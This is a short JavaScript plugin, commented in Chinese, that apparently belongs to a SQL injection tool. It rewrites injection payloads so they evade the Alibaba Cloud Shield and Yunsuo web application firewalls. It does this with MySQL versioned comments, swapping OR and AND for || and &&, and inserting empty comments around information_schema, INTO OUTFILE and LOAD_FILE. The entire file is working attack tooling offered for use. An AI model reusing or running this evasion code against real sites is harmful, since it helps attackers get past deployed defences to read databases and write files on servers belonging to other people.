// yundun.js — 针对 阿里云盾/云锁 WAF 的绕过插件
// 策略：MySQL versioned comments /*!...*/ + OR→|| + AND→&& + 空注释插入
export const yundun = {
  name: 'yundun',
  description: '针对 阿里云盾/云锁 WAF：MySQL versioned comment /*!...*/ + OR→|| + AND→&&',
  transform(payload, ctx) {
    let s = String(payload ?? '');
    // 1) UNION SELECT → /*!UNION*/ /*!SELECT*/
    s = s.replace(/\bunion\b\s+\bselect\b/gi, '/*!UNION*/ /*!SELECT*/');
    s = s.replace(/\bunion\b\s+\ball\b\s+\bselect\b/gi, '/*!UNION*/ /*!ALL*/ /*!SELECT*/');
    // 2) OR → || (MySQL 语法)
    s = s.replace(/\bor\b\s+(\d+)\s*=\s*(\d+)/gi, '|| $1=$2');
    // 3) AND → &&
    s = s.replace(/\band\b\s+(\d+)\s*=\s*(\d+)/gi, '&& $1=$2');
    // 4) 关键字间插入空注释 /*!*/
    s = s.replace(/\bfrom\b\s+information_schema/gi, 'FROM/*!*/information_schema');
    s = s.replace(/\binto\b\s+outfile/gi, 'INTO/*!*/OUTFILE');
    s = s.replace(/\bload_file\b/gi, 'LOAD_FILE');
    return s;
  },
};